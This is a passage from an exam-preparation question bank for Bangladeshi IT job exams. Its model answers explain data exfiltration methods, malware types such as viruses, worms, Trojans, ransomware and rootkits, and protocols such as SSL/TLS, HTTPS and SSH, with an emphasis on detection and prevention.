   - Covert channels: DNS tunnelling, in which data is encoded into DNS queries, ICMP tunnelling, and hiding data inside images by steganography. These are used because DNS and ICMP are rarely blocked or inspected.
   - Encryption and compression of the stolen data before transfer, so that content inspection cannot recognise it.
   - Slow and low transfer, sending small amounts over a long period to stay below alerting thresholds.
   - Physical means: USB drives, external disks, printed documents and photographs of screens.
   - Cloud and collaboration abuse: uploading to a personal cloud drive or a code repository.
   - Insider action, which is the hardest to detect, since the person is authorised to see the data.

   Where it fits in an attack:
   - Initial access, then privilege escalation, then lateral movement, then discovery and collection, then exfiltration, and finally in a ransomware case encryption. Modern ransomware exfiltrates before encrypting, so that the victim can be extorted twice.

   Impact: loss of customer and financial data, intellectual property theft, regulatory penalties, mandatory breach disclosure, reputational damage and blackmail.

   Detection and prevention:
   - Data Loss Prevention tools that inspect content leaving the network and block or alert on sensitive patterns such as card numbers and national identity numbers.
   - Egress filtering: block outbound traffic by default and permit only what is required, which defeats most simple channels.
   - Monitor for anomalies: unusual data volumes, transfers at unusual hours, connections to unfamiliar destinations, and abnormally large DNS query volumes.
   - Classify and encrypt sensitive data, so that stolen data is unusable.
   - Least privilege and need to know, so that a compromised account can reach only a small part of the data.
   - Control removable media and restrict cloud storage and personal email at work.
   - Network segmentation and monitoring of east-west traffic, a SIEM with correlation rules, and user and entity behaviour analytics.
   - Insider threat programme, and logging of all bulk data access and export.
3. **Software downloaded from internet and installed that is not malicious is called?** *[BCC Assistant Programmer 11.11.2023 compact it 547 (ET: N/A)]*


   Answer: Software downloaded from the Internet and installed, which is not malicious, is called legitimate or benign software. Where the question intends a specific security term, the expected answer is freeware or shareware, or in the broader category simply an application program.

   The relevant distinctions:
   - Freeware: software provided free of charge, but with the source code kept closed. Examples: Adobe Acrobat Reader, VLC media player, Skype.
   - Shareware: distributed free for a trial period, after which payment is required. Examples: WinRAR, older versions of WinZip.
   - Open source software: the source code is available and may be modified and redistributed under a licence. Examples: Linux, Firefox, LibreOffice.
   - Commercial or proprietary software: purchased under a licence, with the source closed.
   - Public domain software: released with all rights waived.

   Terms for the malicious counterparts, which the question is distinguishing it from:
   - Malware is the general term for any software written to cause harm: viruses, worms, Trojans, ransomware, spyware and rootkits.
   - Potentially Unwanted Program, PUP, or greyware: software that is not strictly malicious but is unwanted, such as toolbars, adware and system optimisers bundled with a legitimate installer.
   - Bloatware: unnecessary pre-installed software that consumes resources without being harmful.

   - The practical caution the examiner is looking for: software downloaded from the Internet is safe only when it comes from the official source. The same application obtained from a third party download site is a very common carrier of Trojans and PUPs, and pirated or cracked software is the single commonest infection route. Verify the publisher's digital signature and, where provided, the file hash. <!-- verify -->
4. **একটি Virus ও Ransomware এর নাম লিখ?** *[BTCL Junior Assistant Manager 2022 compact it 640 (ET: BUET)]*


   Answer:

   Name of a virus:
   - Melissa, a macro virus of 1999 that spread through infected Word documents attached to email and mailed itself to the first fifty contacts in the victim's address book.
   - Other well known viruses: CIH or Chernobyl, which overwrote the BIOS; ILOVEYOU in 2000; and Stuxnet, which targeted industrial control systems.

   Name of a ransomware:
   - WannaCry, of May 2017, which encrypted files and demanded a Bitcoin payment. It spread as a worm using the EternalBlue vulnerability in Windows SMB and affected more than two hundred thousand computers in 150 countries within days, including hospitals of the British National Health Service.
   - Other well known ransomware: Petya and NotPetya, Ryuk, LockBit, REvil and Locky.

   - The distinction between the two: a virus attaches itself to a host file and replicates when that file is run, and its harm is usually corruption or deletion. Ransomware is a payload rather than a spreading mechanism: it encrypts the victim's data and demands payment for the key, and modern strains also steal the data first so that the victim can be extorted a second time by the threat of publication.
   - The defence against ransomware specifically is offline or immutable backups that have actually been tested by restoration, together with prompt patching, email filtering, network segmentation and least privilege.
5. **What is Trojan horse virus?** *[CAAB Assistant Programmer (AP) 2022 compact it 726 (ET: N/A)]*


   Answer:

   - A Trojan horse is malware that disguises itself as legitimate, useful software so that the user installs it voluntarily. The name comes from the wooden horse of Troy: an apparent gift concealing an attack.
   - Its defining characteristic is that it does not replicate. Unlike a virus it attaches to nothing, and unlike a worm it does not spread by itself; it depends entirely on deceiving the user.
   - How it arrives: a pirated or cracked application, a fake antivirus or system optimiser, a fake software update, a game or utility from an unofficial site, an email attachment, or a malicious mobile application.
   - What it does once installed: opens a backdoor for remote control; steals passwords, banking credentials and files; logs keystrokes; captures the screen and the camera; downloads further malware such as ransomware; and enrols the machine in a botnet.
   - Types: backdoor Trojan, banking Trojan such as Zeus and Emotet, downloader or dropper, remote access Trojan, rootkit Trojan, ransomware dropper, and fake antivirus.
   - Detection and prevention: install software only from official sources; never use pirated software, which is the commonest carrier; keep antivirus and endpoint detection current; watch for unexpected network connections and unexplained slowness; apply least privilege so that malware cannot install system wide; and educate users, since the Trojan's only entry point is the user's decision.
6. **Computer এর Virus কি?** *[BPSC Computer Operator 2021 compact it 780 (ET: N/A)]*


   Answer: A computer virus is a malicious program that attaches itself to a legitimate file, program or boot sector and replicates itself when that host is executed, spreading from one file and one computer to another and damaging data or disrupting the system.

   Characteristics:
   - It requires a host; it cannot exist as an independent program.
   - It requires human action to spread: the user must run the infected program, open the infected document or connect the infected drive.
   - It replicates by inserting its own code into other files.
   - It usually has a trigger condition and a payload, so the damage may occur long after the infection.

   Components of a virus:
   - Infection mechanism, that is the routine that finds and infects new hosts.
   - Trigger, or logic bomb, that is the condition on which the payload activates, such as a date or a number of executions.
   - Payload, the actual damaging action.
   - Concealment routines, which hide the virus from detection.

   Types:
   - File infector, which attaches to executable files.
   - Boot sector virus, which infects the master boot record.
   - Macro virus, which lives in the macros of a document, as Melissa did.
   - Polymorphic virus, which changes its own code at each infection to defeat signature detection.
   - Metamorphic and stealth viruses, and multipartite viruses that infect both files and boot sectors.

   Symptoms of infection: the computer becomes slow, files disappear or become corrupted, unusual messages appear, programs crash, free disk space falls unexpectedly, and the antivirus is disabled.

   Prevention: keep antivirus software installed and current, keep the operating system and applications patched, do not run software from untrusted sources, avoid pirated software, scan removable media, do not open unexpected attachments, use a firewall, apply least privilege, and keep regular backups.
7. **Trojan Horse কি?** *[BPSC Computer Operator 2021 compact it 781 (ET: N/A)]*


   Answer:

   - A Trojan horse is malware that disguises itself as legitimate, useful software so that the user installs it voluntarily. The name comes from the wooden horse of Troy: an apparent gift concealing an attack.
   - Its defining characteristic is that it does not replicate. Unlike a virus it attaches to nothing, and unlike a worm it does not spread by itself; it depends entirely on deceiving the user.
   - How it arrives: a pirated or cracked application, a fake antivirus or system optimiser, a fake software update, a game or utility from an unofficial site, an email attachment, or a malicious mobile application.
   - What it does once installed: opens a backdoor for remote control; steals passwords, banking credentials and files; logs keystrokes; captures the screen and the camera; downloads further malware such as ransomware; and enrols the machine in a botnet.
   - Types: backdoor Trojan, banking Trojan such as Zeus and Emotet, downloader or dropper, remote access Trojan, rootkit Trojan, ransomware dropper, and fake antivirus.
   - Detection and prevention: install software only from official sources; never use pirated software, which is the commonest carrier; keep antivirus and endpoint detection current; watch for unexpected network connections and unexplained slowness; apply least privilege so that malware cannot install system wide; and educate users, since the Trojan's only entry point is the user's decision.
8. **What is QR code? What is Rootkit and bootkit?** *[BITAC Assistant Maintenance Engineer (ICT) 2021 compact it 820-821 (ET: BUET)]*


   Answer:

   What a QR code is:
   - A QR code, Quick Response code, is a two dimensional barcode consisting of black squares arranged on a white grid, which encodes data that a camera and decoding software can read very quickly.
   - It was invented by Denso Wave in Japan in 1994 for tracking vehicle parts.
   - Compared with a linear barcode it holds far more data — up to about 7,089 numeric or 4,296 alphanumeric characters — because it stores information in two dimensions rather than one.
   - It has three large position detection squares at the corners, so it can be read from any angle, and it uses Reed-Solomon error correction, so it still reads correctly when up to 30 percent of it is damaged or obscured.
   - Uses: payment, which in Bangladesh is now widespread with bKash and Nagad merchant QR; product information; website links; Wi-Fi credentials; contact details; ticketing; and enrolling an authenticator application.
   - Security concern: a QR code is unreadable to a human, so the user cannot see where it leads. Quishing, that is QR code phishing, exploits this by placing a malicious code over a genuine one on a poster or a payment terminal, sending the victim to a counterfeit site. The defence is to check the URL before opening it and to be suspicious of a code stuck over another.

   What a rootkit is:
   - A rootkit is malware designed to obtain and maintain privileged, that is root or administrator, access to a system while concealing its own presence and the presence of other malware.
   - It works by subverting the operating system itself: hooking system calls, modifying kernel structures, or filtering the results of file and process listings, so that its files, processes, registry keys and network connections are simply not reported to the user or to security software.
   - Types by level: user mode rootkits, which hook library calls and are the easiest to detect; kernel mode rootkits, which run with full system privilege; bootkits, described below; hypervisor rootkits, which install a malicious hypervisor beneath the operating system; and firmware rootkits in the BIOS, UEFI or a device's firmware, which survive even a disk replacement.
   - Detection: extremely difficult from within the infected system, because the system's own reporting is compromised. Methods are behavioural analysis, memory forensics, integrity checking against known good hashes, and scanning the disk from a clean external boot medium.
   - Removal: the only reliable course is to reformat and reinstall from trusted media; for a firmware rootkit, to reflash the firmware or replace the hardware.

   What a bootkit is:
   - A bootkit is a rootkit that infects the boot process itself, placing its code in the Master Boot Record, the Volume Boot Record or the UEFI firmware, so that it loads before the operating system and before any antivirus.
   - Because it gains control first, it can modify the kernel as it loads, disable security features and remain invisible to everything that runs afterwards. It also survives reinstallation of the operating system, since the boot code is not on the system partition.
   - Examples: TDL4 or Alureon, Stoned Bootkit, and the UEFI implants LoJax and MoonBounce.
   - Defence: UEFI Secure Boot, which verifies the digital signature of each stage of the boot chain; Measured Boot with a TPM; firmware passwords and signed firmware updates; and keeping the firmware itself patched.
9. **Suppose your computer system is attack by a VIRUS and it's also copy into the six neighbor computer. Then it encrypts your all data in your all data in your system so that you can’t detect your data. What is the name of the VIRUS, how can you detect it?** *[BITAC Assistant Maintenance Engineer (ICT) 2021 compact it 821 (ET: BUET)]*


   Answer:

   Name of the malware described:
   - The behaviour given is that of ransomware, and specifically of a worm-ransomware hybrid, since it both copies itself to neighbouring computers and encrypts the victim's data.
   - The classic example matching this description exactly is WannaCry, of May 2017. Its ransomware payload encrypted the files and demanded a Bitcoin payment, while its worm component used the EternalBlue vulnerability in the Windows SMB service to spread automatically to every reachable unpatched machine, with no user action at all. Other examples are NotPetya and Ryuk.
   - Note on terminology, which the examiner is testing: it is not strictly a virus. A virus needs a host file and human action to spread. Something that copies itself to six neighbouring computers by itself is a worm, and the encryption payload makes it ransomware.

   How it can be detected:
   - Symptoms visible to the user: files suddenly unopenable and renamed with an unfamiliar extension such as `.wncry` or `.locked`; a ransom note appearing on the desktop and in every folder; the machine slowing sharply during the encryption; shadow copies and restore points deleted; and antivirus or Task Manager disabled.
   - Network indicators: a sudden burst of scanning on port 445 or 3389 to neighbouring addresses, which is the worm spreading; connections to unknown external addresses, which is the command and control channel; and unusual outbound data volume, which is exfiltration before encryption.
   - Endpoint detection and response, which detects the behaviour of mass file modification, shadow copy deletion and process injection, rather than relying on a signature the malware may not match.
   - File integrity monitoring and honeypot files: a small set of decoy files whose modification triggers an immediate alarm and isolates the host.
   - SIEM correlation: a spike in file rename events across a file server, or many failed authentication attempts followed by successful lateral movement.
   - Antivirus signature and heuristic scanning, which catches known families.
   - Offline forensic examination by booting from clean media, since a compromised system cannot be trusted to report on itself.

   Immediate response:
   - Isolate the affected machines from the network at once, physically if necessary, to stop the spread; this takes priority over investigation.
   - Do not pay the ransom; it funds the crime and does not guarantee recovery.
   - Preserve evidence, identify the strain, and check whether a free decryptor exists, for example through the No More Ransom project.
   - Restore from offline backups after rebuilding the systems, patch the vulnerability that allowed the spread, reset all credentials, and report as required by the regulator.

   Prevention: prompt patching, since WannaCry exploited a vulnerability for which a patch had been available for two months; offline and immutable backups tested by restoration; network segmentation to limit lateral movement; disabling SMBv1 and unnecessary services; least privilege; email filtering; and endpoint detection and response.
10. **‘Trojan Horse’ এর একটি বৈশিষ্ট্য লিখুন।** *[DMLC Assistant Teacher (ICT) 2021 compact it 825 (ET: N/A)]*


   Answer: The defining characteristic of a Trojan horse is that it disguises itself as legitimate, useful software so that the user installs it voluntarily, and it does not replicate itself.

   - Unlike a virus it attaches to no host file, and unlike a worm it does not spread across the network by itself. Its only route of entry is the user's own decision to install it, obtained by deception.
   - Other characteristics that follow from this: it usually performs the advertised function so that nothing appears wrong, while carrying out its real purpose in the background; it commonly opens a backdoor for remote control; and it is most often distributed through pirated software, fake updates, fake antivirus tools and unofficial application stores.
   - Because it does not replicate, it is not detected by looking for spreading behaviour; it is detected by behavioural analysis of what the installed program actually does, and prevented by installing software only from official sources.
11. **Explain: Worm, Botnet, Ransomware and Trojan horse.** *[SPCBL Assistant Maintenance Engineer 20.11.2021 compact it 874 (ET: N/A)]*


   Answer:

   Worm:
   - A worm is a standalone malicious program that replicates itself and spreads across a network automatically, without needing a host file and without any human action.
   - It spreads by exploiting vulnerabilities in network services, by scanning for open ports, through email address books, and across shared drives.
   - Its immediate harm is consumption of bandwidth and system resources, which can saturate a network entirely, and it usually carries a payload such as a backdoor or ransomware.
   - Because it needs no human action, it spreads extremely fast: SQL Slammer infected most vulnerable hosts worldwide in about ten minutes.
   - Examples: Morris worm, SQL Slammer, Conficker, Blaster.
   - Defence: patch the vulnerability it exploits, segment the network, close unnecessary services, and monitor for scanning behaviour.

   Botnet:
   - A botnet is a network of compromised computers, called bots or zombies, under the remote control of an attacker known as the botmaster, through a command and control infrastructure.
   - The owners are unaware; the machine works normally while executing the botmaster's instructions in the background.
   - Uses: launching Distributed Denial of Service attacks, sending spam, harvesting credentials, click fraud, cryptomining, and distributing further malware.
   - Command and control may be centralised through an IRC or HTTP server, or peer to peer, which is far harder to dismantle. Domain generation algorithms are used to evade blocking.
   - Examples: Mirai, which used insecure IoT devices to launch some of the largest DDoS attacks ever recorded; Zeus; Emotet.
   - Defence: endpoint protection, egress filtering and DNS monitoring to detect command and control traffic, prompt patching, and changing default credentials on IoT devices.

   Ransomware:
   - Ransomware is malware that encrypts the victim's files and demands a payment, usually in cryptocurrency, in exchange for the decryption key.
   - It arrives through phishing attachments, exploited vulnerabilities, exposed RDP, or a compromised software update.
   - It typically gains a foothold, escalates privileges, moves laterally, deliberately deletes backups and shadow copies, and only then encrypts, leaving a ransom note.
   - Double extortion is now standard: the data is stolen before encryption, so the attacker also threatens to publish it, which defeats the defence of simply restoring from backup.
   - Examples: WannaCry, NotPetya, Ryuk, LockBit.
   - Defence: offline or immutable backups tested by restoration, prompt patching, email filtering, endpoint detection and response, network segmentation, least privilege and multi-factor authentication. Paying is discouraged.

   Trojan horse:

   - A Trojan horse is malware that disguises itself as legitimate, useful software so that the user installs it voluntarily. The name comes from the wooden horse of Troy: an apparent gift concealing an attack.
   - Its defining characteristic is that it does not replicate. Unlike a virus it attaches to nothing, and unlike a worm it does not spread by itself; it depends entirely on deceiving the user.
   - How it arrives: a pirated or cracked application, a fake antivirus or system optimiser, a fake software update, a game or utility from an unofficial site, an email attachment, or a malicious mobile application.
   - What it does once installed: opens a backdoor for remote control; steals passwords, banking credentials and files; logs keystrokes; captures the screen and the camera; downloads further malware such as ransomware; and enrols the machine in a botnet.
   - Types: backdoor Trojan, banking Trojan such as Zeus and Emotet, downloader or dropper, remote access Trojan, rootkit Trojan, ransomware dropper, and fake antivirus.
   - Detection and prevention: install software only from official sources; never use pirated software, which is the commonest carrier; keep antivirus and endpoint detection current; watch for unexpected network connections and unexplained slowness; apply least privilege so that malware cannot install system wide; and educate users, since the Trojan's only entry point is the user's decision.
12. **Malware বলতে কী বুঝানো হয়? উদাহরণসহ সংক্ষেপে বর্ণনা করুন।** *[41th BCS 2021 compact it 883 (ET: N/A)]*


   Answer:

   - Malware, short for malicious software, is any program written deliberately to damage, disrupt or gain unauthorised access to a computer, a network or data.

   Types with examples:
   - Virus: attaches itself to a file or program and replicates when the host is executed. It needs human action to spread. Examples: Melissa, CIH.
   - Worm: a standalone program that replicates and spreads across the network by itself, exploiting vulnerabilities. Examples: Morris worm, SQL Slammer, Conficker.
   - Trojan horse: disguises itself as legitimate software so the user installs it; it does not replicate. Examples: Zeus, Emotet.
   - Ransomware: encrypts the victim's data and demands payment for the key, now usually with the added threat of publishing stolen data. Examples: WannaCry, LockBit, Ryuk.
   - Spyware and keyloggers: secretly monitor activity and steal credentials and personal data.
   - Adware: displays unwanted advertisements and often tracks browsing.
   - Rootkit: hides deep in the operating system or the firmware to conceal an attacker's presence and maintain privileged access.
   - Botnet malware: enrols the machine as a bot under a command and control server, for use in DDoS attacks or spam.
   - Logic bomb: dormant code that triggers on a condition such as a date or the deletion of an employee record.
   - Cryptojacking malware: uses the victim's processor to mine cryptocurrency.
   - Fileless malware: lives in memory and in legitimate tools such as PowerShell, leaving no file for an antivirus to scan.

   How it spreads: email attachments and links, malicious or compromised websites, pirated software, infected USB drives, unpatched vulnerabilities, and supply chain compromise of a legitimate update.

   Prevention: keep systems patched, use endpoint protection with behavioural detection, filter email and web traffic, apply least privilege, segment the network, take offline immutable backups, and train users, since most infections begin with a human action.
13. **Define component of computer virus.** *[BREB Assistant General Manager (IT) 2021 compact it 934 (ET: N/A)]*


   Answer: A computer virus has three essential components, and usually a fourth for concealment.

   - Infection mechanism, also called the infection vector: the routine that searches for suitable hosts and inserts a copy of the virus into them. This is what makes it a virus rather than any other kind of malware, and it defines how the virus spreads, whether by infecting executable files, the boot sector or document macros.
   - Trigger, also called the logic bomb: the condition that decides when the payload will run. It may be a particular date, a number of executions, the presence or absence of a file, or a specific user action. The delay between infection and activation is deliberate, so that the virus can spread widely before it is noticed.
   - Payload: the actual action the virus performs when triggered. It may be destructive, such as deleting or corrupting files, formatting the disk or overwriting the BIOS; or it may steal data, open a backdoor, display a message or simply consume resources. Some viruses have no payload at all beyond replication.
   - Concealment or defence mechanism: the code that hides the virus from detection. Stealth viruses intercept system calls to report the original uninfected file; encrypted viruses encrypt their own body with a changing key; polymorphic viruses change their decryption routine at every infection to defeat signature matching; and metamorphic viruses rewrite their entire code.

   Phases of a virus, which correspond to these components:
   - Dormant phase: the virus is idle and waiting for the trigger.
   - Propagation phase: the infection mechanism copies the virus into other hosts.
   - Triggering phase: the condition is met and the virus activates.
   - Execution phase: the payload runs and the damage occurs.

   - The practical consequence: antivirus software targets the infection mechanism and the concealment routines, because the payload may never have been seen before, and behavioural detection watches for the act of a program modifying other executables, which is the one thing every virus must do.
14. **দুটি এন্টিভাইরাস সফটওয়্যার এর নাম লিখ।** *[BPSC Ministry of Women and Children Affairs Computer Trainer 2021 compact it 945 (ET: N/A)]*


   Answer: Two antivirus software packages:

   - Kaspersky Anti-Virus, a widely used commercial product with strong detection rates.
   - Bitdefender Antivirus, another leading commercial product, well regarded in independent testing.

   Other well known antivirus software:
   - Microsoft Defender, built into Windows and now a capable product requiring no separate purchase.
   - Norton, McAfee, ESET NOD32, Avast, AVG and Trend Micro.
   - Free options: Avast Free, AVG Free and Avira, and on Linux ClamAV.
   - Enterprise endpoint detection and response platforms: CrowdStrike Falcon, SentinelOne, Sophos Intercept X and Symantec Endpoint Protection.

   How antivirus software works: signature matching against a database of known malware; heuristic analysis of suspicious code structure; behavioural monitoring of what a program actually does; sandboxing of unknown files; and cloud reputation lookup. Real time protection scans files as they are accessed, and scheduled scans check the whole disk.

   - Practical point worth stating: antivirus software is necessary but not sufficient. It cannot detect an unknown zero day threat by signature, and modern fileless malware leaves no file to scan. It must be combined with prompt patching, least privilege, network segmentation, tested backups and user awareness.
15. **কম্পিউটার ভাইরাস, ওয়ার্ম এবং ট্রোজান হর্স এর মধ্যে পার্থক্য লিখ।** *[PGCL Sub Assistant Engineer (CSE) 2021 compact it 947 (ET: BUET)]*


   Answer:

   | Point | Virus | Worm | Trojan horse |
   |---|---|---|---|
   | Host required | Yes; it attaches to a file or program | No; it is a standalone program | No; it is itself a complete program |
   | Replication | Replicates when the infected host is executed | Replicates by itself, automatically | Does not replicate at all |
   | Spread | Needs human action: running the file, sharing it, using an infected USB | Spreads across the network by itself, exploiting vulnerabilities | Spread by deceiving the user into installing it |
   | Speed of spread | Slow, limited by human action | Extremely fast; a worm can cross the world in minutes | Depends entirely on how convincing the deception is |
   | Main harm | Corrupts or deletes files, damages the host | Consumes bandwidth and resources, and delivers a payload | Opens a backdoor, steals data, installs further malware |
   | Detection | Antivirus signature and heuristic scanning | Unusual network traffic and rapid scanning behaviour | Behavioural monitoring; it looks legitimate |
   | Examples | Melissa, CIH, file infectors | Morris worm, SQL Slammer, Conficker, WannaCry's spreading component | Zeus, Emotet, fake antivirus, a pirated application carrying a payload |
   | Analogy | A biological virus needing a cell | A self propelled organism | The wooden horse of Troy: a gift concealing an attack |

   The essential distinctions:
   - A virus is parasitic: it cannot exist without a host file and cannot spread without a human running that file.
   - A worm is independent and self propelled: it is a complete program that finds its own victims across the network and transmits itself with no human involvement, which is why worm outbreaks are measured in minutes.
   - A Trojan neither attaches nor replicates: its whole method is deception, persuading the user to install it, after which it acts quietly in the background.

   Consequences for defence:
   - Against a virus: antivirus scanning, care about what is executed, and avoiding pirated software.
   - Against a worm: prompt patching of the vulnerability it exploits, network segmentation, closing unnecessary services, and monitoring for scanning behaviour. User caution is useless here.
   - Against a Trojan: installing software only from official sources, verifying digital signatures, least privilege, behavioural detection, and user education.
   - Modern malware combines them: WannaCry was ransomware carried by a worm, and Emotet was a Trojan that later behaved as a worm on the local network.

## Security Protocols (SSL/TLS, HTTPS) (11)

1. **What is SSL?** *[BCC Assistant Network Engineer 18.10.2025 compact it 1441 (ET: BCC)]*


   Answer: SSL stands for Secure Sockets Layer. It is a cryptographic protocol developed by Netscape in the 1990s to provide a secure, encrypted channel between a client and a server over an insecure network.

   - SSL, Secure Sockets Layer, and TLS, Transport Layer Security, are cryptographic protocols that provide a secure channel between two applications over a network. TLS is the successor to SSL; SSL versions 2.0 and 3.0 are obsolete and insecure, and the current versions in use are TLS 1.2 and TLS 1.3.
   - They sit between the transport layer and the application layer, so any application protocol can be wrapped in them: HTTP becomes HTTPS, SMTP becomes SMTPS, FTP becomes FTPS, and the same applies to IMAP, LDAP and database connections.

   What they provide:
   - Confidentiality: all traffic is encrypted with a symmetric cipher such as AES, so an interceptor sees only ciphertext.
   - Integrity: a message authentication code detects any alteration in transit.
   - Authentication: the server proves its identity with an X.509 certificate issued by a trusted Certifying Authority, and the client may optionally do the same in mutual TLS.

   How the handshake works:
   - The client sends a ClientHello listing the TLS versions and cipher suites it supports, with a random value.
   - The server replies with a ServerHello choosing the version and cipher suite, its own random value, and its certificate.
   - The client validates the certificate: the signature chain up to a trusted root, the validity dates, the domain name, and the revocation status.
   - The two sides perform a key exchange, in modern practice ephemeral Diffie-Hellman or ECDHE, and derive a shared symmetric session key. Because the key is ephemeral, it gives forward secrecy: recording the traffic and later stealing the server's private key does not allow it to be decrypted.
   - Both sides confirm with a Finished message, and all application data is then encrypted with the symmetric session key.
   - This is hybrid encryption: asymmetric cryptography authenticates and agrees the key, and fast symmetric cryptography protects the data.

   Important qualification: SSL itself is obsolete and insecure. SSL 2.0 and SSL 3.0 have both been broken, SSL 3.0 by the POODLE attack in 2014, and both are formally deprecated. What is used today is TLS, and the word SSL survives only as a colloquialism, as in the phrase "SSL certificate", which is in fact a TLS certificate.
2. **Which client is used to security cannot to a remote server?** *[BARI Assistant Maintenance Engineer 15.11.2025 compact it 1452 (ET: N/A)]*


   Answer: SSH, the Secure Shell client, is used to connect securely to a remote server.

   - SSH runs over TCP port 22 and provides an encrypted channel for remote command line login, so the username, the password and every command are protected from interception.
   - It authenticates the server by its host key, which prevents connection to an impostor, and it authenticates the user by password or, far better, by a public and private key pair.
   - It also provides secure file transfer through SCP and SFTP, and port forwarding, which tunnels other protocols through the encrypted channel.
   - Common clients: OpenSSH on Linux and macOS and now built into Windows, PuTTY, MobaXterm and Termius.

   Why not the alternatives:
   - Telnet, on port 23, performs the same remote login function but sends everything, including the password, in plain text, so it must never be used across an untrusted network.
   - FTP on port 21 is similarly unencrypted; SFTP over SSH or FTPS over TLS should be used instead.
   - For graphical remote access the secure options are RDP with TLS, or VNC tunnelled through SSH or a VPN.
3. **Ensure secure communication between a client application and the database server.** *[Sonali Bank PLC Assistant Database Administrator 23.02.2024 compact it 314 (ET: N/A)]*


   Answer: Securing communication between a client application and a database server requires encryption in transit, strong authentication and network restriction, so that the connection cannot be read, altered or established by anyone unauthorised.

   Encryption in transit:
   - Enable TLS on the database server and require it for every connection. All the major databases support it: `require_secure_transport` in MySQL, `ssl = on` with `hostssl` entries in PostgreSQL, Force Encryption in SQL Server, and TCPS in Oracle.
   - Configure the client connection string to demand verification, not merely encryption: use `verify-full` in PostgreSQL or `VERIFY_IDENTITY` in MySQL, so that the client checks the server's certificate and its hostname. Encryption without verification still permits a man in the middle.
   - Use TLS 1.2 or 1.3 only, with strong cipher suites, and disable SSL 3.0, TLS 1.0 and TLS 1.1.
   - Deploy certificates from an internal or public Certifying Authority, and manage their renewal so they never expire unnoticed.
   - Use mutual TLS where the sensitivity justifies it, so the database also authenticates the client by certificate.

   Authentication and authorisation:
   - Strong, unique credentials for the application account, stored in a secrets manager or a vault rather than in the source code or a configuration file.
   - A dedicated database account per application, with the minimum privileges it actually needs: no DDL rights, no access to system catalogues, and no superuser.
   - Certificate or integrated authentication, such as Kerberos or Active Directory, in preference to a password where the environment allows.
   - Rotate credentials regularly, and remove default and unused accounts.

   Network controls:
   - Never expose the database directly to the Internet. Place it in a separate protected network zone and permit access only from the application servers, by firewall rule, on the specific port.
   - Change the default port where it adds value, and disable any unused network protocols on the server.
   - Use a VPN or an SSH tunnel where the application must connect across an untrusted network.
   - Bind the listener to a specific interface rather than to all addresses.

   Data and application controls:
   - Encrypt data at rest as well: transparent database encryption, and column level encryption for the most sensitive fields such as card numbers, with keys held in a hardware security module.
   - Use parameterised queries in the application, since the most likely route to the data is SQL injection through the application rather than interception of the wire.
   - Apply connection pooling with a bounded pool, and set connection timeouts.

   Monitoring and governance:
   - Enable database auditing of logins, privileged actions and bulk data access, and ship the logs to a SIEM.
   - Alert on failed logins, connections from unexpected addresses and unusually large result sets.
   - Patch the database engine promptly, and run periodic vulnerability assessment and configuration review against a CIS benchmark.
   - Encrypt backups and test the restoration.
4. **Difference between HTTP and HTTPs.** *[PGCB Assistant Engineer (CSE) 17.05.2024 compact it 398 (ET: BUET)]*


   Answer:

   | Point | HTTP | HTTPS |
   |---|---|---|
   | Full form | HyperText Transfer Protocol | HyperText Transfer Protocol Secure |
   | Security | Data travels in plain text | Data is encrypted with SSL/TLS |
   | Port | 80 | 443 |
   | Certificate | Not required | An SSL/TLS certificate from a trusted CA is required |
   | Protection provided | None | Confidentiality, integrity and server authentication |
   | Vulnerability | Open to eavesdropping, tampering and man in the middle | Protected against all three, provided the certificate is validated |
   | Browser indication | Marked "Not Secure" | Padlock shown |
   | Speed | Marginally faster, with no handshake | A small handshake cost, negligible today and offset by HTTP/2 and HTTP/3 |
   | SEO and modern protocols | Ranked lower; HTTP/2 and HTTP/3 are effectively unavailable | Ranked higher; required in practice for HTTP/2 and HTTP/3 |
   | Suitable for | Nothing sensitive; and in practice nothing at all today | Login pages, banking, payment, and any site handling personal data |

   - HTTPS is simply HTTP carried inside a TLS encrypted channel. The application protocol is unchanged; the security is added by the layer beneath it.
   - The modern position is that HTTPS should be used everywhere, not only on pages that handle sensitive data, because an attacker who can modify any page on a site can inject content into it. HSTS should also be enabled so that a downgrade to HTTP is impossible.
5. **(গ) HTTP ও HTTPS প্রোটোকলের মধ্যে সুরক্ষার দিক থেকে কোনটি কার্যকর?** *[প্রাসঙ্গিক টেকনিক্যাল, বিষয় কোড: ১০৫, মান: ৮০ - পাসপোর্ট অফিস সহকারী প্রোগ্রামার এক্সাম: ২০২৪]*


   Answer: HTTPS is far more effective than HTTP from the point of view of security, and it should be used for every website.

   Why HTTPS is effective and HTTP is not:
   - Confidentiality: HTTPS encrypts everything with TLS, so an interceptor on a public Wi-Fi network, at an ISP or anywhere along the path sees only unreadable ciphertext. With HTTP the password, the card number, the national identity number and the whole page content are visible to anyone who captures the traffic.
   - Integrity: TLS attaches a message authentication code to every record, so any alteration in transit is detected and the connection is aborted. With HTTP an attacker can inject advertisements, malware or false content into the page, and neither the user nor the server will know.
   - Authentication: the server presents an X.509 certificate issued by a trusted Certifying Authority, and the browser verifies the signature chain, the validity dates and the domain name. This proves the site is genuine. HTTP offers no assurance at all, so a counterfeit site is indistinguishable from the real one.
   - Protection against specific attacks: HTTPS defeats eavesdropping, session cookie theft, man in the middle interception and content injection, all of which are trivial against HTTP.
   - Regulatory and legal: PCI DSS for card data, data protection law and the Bangladesh Bank ICT security guidelines effectively make HTTPS mandatory for any site handling personal or financial data.
   - Practical: browsers now label HTTP sites as "Not Secure", search engines rank HTTPS higher, and HTTP/2 and HTTP/3, which are substantially faster, are available only over HTTPS in practice.

   - Ports and mechanism: HTTP uses TCP port 80 and HTTPS uses port 443. HTTPS is not a different application protocol; it is the same HTTP carried inside a TLS channel.
   - Additional measures that complete the protection: HSTS, so the browser refuses to fall back to HTTP; TLS 1.2 or 1.3 only, with weak ciphers disabled; correct certificate management so that certificates never expire; and redirecting all HTTP requests to HTTPS.
6. **Write down the basic differences of the following:**
   **(ii) TLS 1.2 vs. 1.3** *[Rupali Bank Ltd. Assistant Network Engineer 04.11.2023 compact it 535 (ET: MIST)]*


   Answer:

   | Point | TLS 1.2 | TLS 1.3 |
   |---|---|---|
   | Year | 2008, RFC 5246 | 2018, RFC 8446 |
   | Handshake round trips | 2 round trips before data can flow | 1 round trip, and 0-RTT for a resumed session |
   | Speed | Slower connection establishment | Noticeably faster, which matters most on mobile and high latency links |
   | Cipher suites supported | Many, including weak and obsolete options | Only five, all modern and authenticated |
   | Key exchange | RSA key transport, static and ephemeral Diffie-Hellman | Ephemeral Diffie-Hellman only, that is ECDHE or DHE |
   | Forward secrecy | Optional, and often not configured | Mandatory, so recorded traffic cannot be decrypted later even if the server's private key is stolen |
